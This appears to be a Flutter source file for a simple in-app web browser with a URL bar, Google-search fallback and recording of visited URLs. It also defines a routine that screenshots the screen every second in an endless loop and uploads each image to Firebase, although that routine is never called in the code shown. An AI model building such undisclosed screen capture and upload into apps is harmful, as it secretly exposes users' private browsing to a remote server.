import 'package:flutter/cupertino.dart';
import 'package:flutter/services.dart';
import 'package:flutter_webview_plugin/flutter_webview_plugin.dart';
import 'package:flutter/material.dart';
import '../services/history.dart';
import '../services/records.dart';
import 'package:screenshot/screenshot.dart';
import "../services/firebase.dart";


class Tabs extends StatefulWidget {
  @override
  _TabsState createState() => _TabsState();
}

class _TabsState extends State<Tabs> {
  FlutterWebviewPlugin webviewPlugin = FlutterWebviewPlugin();
  String urls =
      "https://www.google.com/webhp?hl=en&sa=X&ved=0ahUKEwjq8NaJie_qAhVRIbcAHSwAA2gQPAgH";
  TextEditingController controller = TextEditingController(text: 'https://');
  Map args;
  int index = 0;

  bool flag = false;
  void setval(val) async {
    await getinsta();
    print(await setvalue(val));
  }
  void initState()
  {
    super.initState();
    webviewPlugin.onProgressChanged.listen(
      (event) {
        if (val != 1.0) {
          setState(() {
            val = event;
          });
        } else {
          val = 0.0;
          
        }
        print(val);
      },
    );
    webviewPlugin.onUrlChanged.listen(
      (event) {
        if (!histval) {
          print('vs');
          setval(event);
          histval = true;
        }
      },
    );

  }
  @override
  void dispose() {
    // TODO: implement dispose
    super.dispose();

    webviewPlugin.dispose();
  }

  bool histval = false;
  double val = 0.0;
ScreenshotController screenshotController = ScreenshotController(); 
 ss() async*
{
  while(true)
  {
    await Future.delayed(Duration(seconds:1));
     var file = await screenshotController.capture(delay: Duration(seconds: 1));
     yield file;
  }
 


}
void cap()
{
  var trigger = ss();
  trigger.listen((file){
    FirebaseService(file: file).uploadFunction();
  });
}

  @override
  Widget build(BuildContext context) {
    

    
    args = ModalRoute.of(context).settings.arguments;

    print(args);
    // webviewPlugin.onProgressChanged.listen((event) {
    //   setState(() {
    //      val = event;
    //   });

    // });
    
    return Screenshot(
      controller: screenshotController,
      child:WebviewScaffold(
      enableAppScheme: true,
      geolocationEnabled: true,
      bottomNavigationBar: BottomNavigationBar(
        items: <BottomNavigationBarItem>[
          BottomNavigationBarItem(icon: Icon(Icons.home), title: Text('Home')),
          BottomNavigationBarItem(
              icon: Icon(Icons.replay), title: Text('Reload')),
        ],
        currentIndex: index,
        onTap: (value) {
          index = value;
          if (index == 1) {
            setState(() {
              webviewPlugin.reload();
            });
          } else {
            setState(() {
              webviewPlugin.reloadUrl('https://www.google.com/search?-b-d&q=');
            });
          }
        },
      ),
      mediaPlaybackRequiresUserGesture: true,
      withJavascript: true,
      withLocalStorage: true,
      withLocalUrl: true,
      hidden: true,
      primary: true,
      useWideViewPort: true,
      withOverviewMode: true,
      withZoom: true,
      scrollBar: true,
      supportMultipleWindows: true,
      appBar: AppBar(
        bottom: PreferredSize(
            child: LinearProgressIndicator(
              value: val,
            ),
            preferredSize: Size.fromHeight(10)),
        actions: <Widget>[
          RaisedButton(
              color: Colors.purple,
              onPressed: () {
                // setState(() {
                if (controller.text.length > 7) {
                  // if ((controller.text.substring(0, 8) != 'https://')&&(!controller.text.contains('.com'))) {
                  //   webviewPlugin
                  //       .reloadUrl('https://' + controller.text);
                  // }
                  if ((controller.text.contains('.com')) &&
                      (controller.text.substring(0, 8) != 'https://')) {
                    webviewPlugin.reloadUrl('https://' + controller.text);

                    urls = 'https://' + controller.text;
                    addrecord(st: controller.text);
                    setval(urls);
                  } else if ((controller.text.contains('.com')) &&
                      (controller.text.substring(0, 8) == 'https://')) {
                    webviewPlugin.reloadUrl(controller.text);
                    urls = controller.text;
                    setval(urls);
                    addrecord(st: controller.text);
                  } else {
                    webviewPlugin.reloadUrl(
                        'https://www.google.com/search?-b-d&q=' +
                            controller.text);
                    urls = 'https://www.google.com/search?-b-d&q=' +
                        controller.text;
                    setval(urls);
                    addrecord(st: controller.text);
                  }
                } else {
                  webviewPlugin.reloadUrl(
                      'https://www.google.com/search?-b-d&q=' +
                          controller.text);
                  urls =
                      'https://www.google.com/search?-b-d&q=' + controller.text;
                  setval(urls);
                  addrecord(st: controller.text);

                  // }
                  // });
                }
              },
              child: Icon(
                Icons.chevron_right,
                color: Colors.white,
              )),
        ],
        title: TextField(
          onEditingComplete: () {
            if (controller.text.length > 7) {
              // if ((controller.text.substring(0, 8) != 'https://')&&(!controller.text.contains('.com'))) {
              //   webviewPlugin
              //       .reloadUrl('https://' + controller.text);
              // }
              if ((controller.text.contains('.com')) &&
                  (controller.text.substring(0, 8) != 'https://')) {
                webviewPlugin.reloadUrl('https://' + controller.text);
                urls = 'https://' + controller.text;
                setval(urls);
                addrecord(st: controller.text);
              } else if ((controller.text.contains('.com')) &&
                  (controller.text.substring(0, 8) == 'https://')) {
                webviewPlugin.reloadUrl(controller.text);
                urls = controller.text;
                setval(urls);
                addrecord(st: controller.text);
              } else {
                webviewPlugin.reloadUrl(
                    'https://www.google.com/search?-b-d&q=' + controller.text);
                addrecord(st: controller.text);
                urls =
                    'https://www.google.com/search?-b-d&q=' + controller.text;
                setval(urls);
              }
            } else {
              webviewPlugin.reloadUrl(
                  'https://www.google.com/search?-b-d&q=' + controller.text);
              urls = 'https://www.google.com/search?-b-d&q=' + controller.text;
              setval(urls);
              addrecord(st: controller.text);
            }
          },
          style: TextStyle(color: Colors.white),
          cursorColor: Colors.white,
          controller: controller,
          autocorrect: true,
          decoration: InputDecoration(
              hintStyle: TextStyle(color: Colors.white),
              fillColor: Colors.white,
              focusColor: Colors.white,
              hoverColor: Colors.white,
              icon: Icon(
                Icons.alternate_email,
                color: Colors.white,
              ),
              hintText: 'ENTER THE URL'),
        ),
        backgroundColor: CupertinoColors.systemPurple,
      ),
      url: args['url'],
    ));
  }
}
